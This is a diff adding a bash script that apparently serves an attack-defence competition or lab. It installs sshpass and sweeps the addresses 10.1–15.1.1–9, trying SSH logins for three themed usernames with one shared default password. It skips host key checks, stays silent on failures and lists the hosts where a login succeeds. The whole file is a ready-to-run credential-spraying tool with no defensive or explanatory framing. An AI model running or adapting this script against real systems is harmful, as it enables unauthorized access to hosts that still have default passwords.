@@ -1,0 +1,24 @@
+#!/bin/bash
+
+sudo apt-get install sshpass  # For Debian/Ubuntu
+# Credentials
+users=("sheriffmccoy" "saloonsally" "docholliday")
+password="Change.me123!"
+
+# Loop through the specified IP ranges
+for x in $(seq 1 15); do
+    for y in $(seq 1 9); do
+        ip="10.$x.1.$y"
+        
+        # Try each user
+        for user in "${users[@]}"; do
+            # Using sshpass with SSH to attempt login
+            if sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "${user}@${ip}" "echo 'Success'" &>/dev/null; then
+                echo "Success: ${user}@${ip}"
+                # Break out of the user loop if successful to move on to the next IP
+                break
+            fi
+            # No output for failed attempts to keep the console clean
+        done
+    done
+done
